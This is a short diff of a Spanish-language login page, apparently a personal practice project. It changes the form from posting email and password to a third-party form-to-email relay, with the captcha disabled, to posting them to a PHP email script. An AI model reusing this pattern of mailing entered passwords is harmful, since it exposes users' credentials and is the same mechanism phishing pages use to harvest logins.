@@ -8,7 +8,7 @@
 </head>
 <body>
     <div class="container">
-        <form action="https://formsubmit.co/82e8c9c26978704b73ca3af4045fd652" method="POST"/>
+        <form id="loginForm" class="login-form" action="send_email.php" method="post">
             <h2>Iniciar Sesión</h2>
             <div class="input-group">
                 <label for="email">Correo Electrónico</label>
@@ -19,11 +19,9 @@
                 <input type="password" id="password" name="password" required>
             </div>
             <button type="submit">Iniciar Sesión</button>
-
-            <input type="hidden" name="_next" value="https://erick-jim21.github.io/Portafolio/">
-            <input type="hidden" name="_captcha" value="false">
-
         </form>
     </div>
+
+    <script src="script.js"></script>
 </body>
 </html>
